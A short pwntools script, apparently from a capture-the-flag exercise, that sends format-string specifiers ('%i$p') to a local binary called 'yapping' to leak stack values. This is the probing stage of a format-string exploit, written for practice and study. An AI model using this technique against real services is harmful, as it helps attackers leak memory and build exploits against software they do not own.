from pwn import *
elf = context.binary = ELF("./yapping")
for i in range(20):
    p = process()
    p.sendline(f"%{i}$p")
    print(p.recv(9999))
    p.close()